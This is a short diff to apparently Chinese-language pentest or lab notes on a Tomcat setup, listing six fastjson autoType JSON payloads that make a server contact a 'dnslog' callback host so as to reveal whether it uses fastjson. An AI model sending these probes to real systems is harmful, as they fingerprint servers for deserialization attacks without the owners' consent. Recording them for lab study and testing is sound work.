@@ -16,8 +16,13 @@ tomcat启动后，将war包放在webapps目录即（tomcat自带dhcp依赖），
 # 判断是否使用fastjon组件
 dns
 ● {"@type":"java.net.Inet4Address","val":"dnslog"}
+
 ● {"@type":"java.net.Inet6Address","val":"dnslog"}
+
 ● {"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
+
 ● {{"@type":"java.net.URL","val":"http://dnslog"}:0
+
 ● {"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
+
 ● Set[{"@type":"java.net.URL","val":"http://dnslog"}]
